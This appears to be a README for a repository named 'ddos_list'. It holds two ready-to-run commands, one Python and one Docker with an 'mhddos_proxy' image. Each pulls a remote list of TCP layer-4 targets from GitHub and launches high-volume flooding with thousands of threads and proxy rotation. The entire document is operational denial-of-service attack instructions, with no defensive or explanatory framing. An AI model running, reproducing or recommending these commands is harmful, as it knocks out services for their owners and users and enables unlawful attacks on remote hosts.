# ddos_list
python3 runner.py  -c https://raw.githubusercontent.com/olamor/ddos_list/main/tcp_l4_all.lst -t 2000 --rpc 1000 -p 350

docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest  -c https://raw.githubusercontent.com/olamor/ddos_list/main/tcp_l4_all.lst -t 2000 --rpc 1000 -p 350
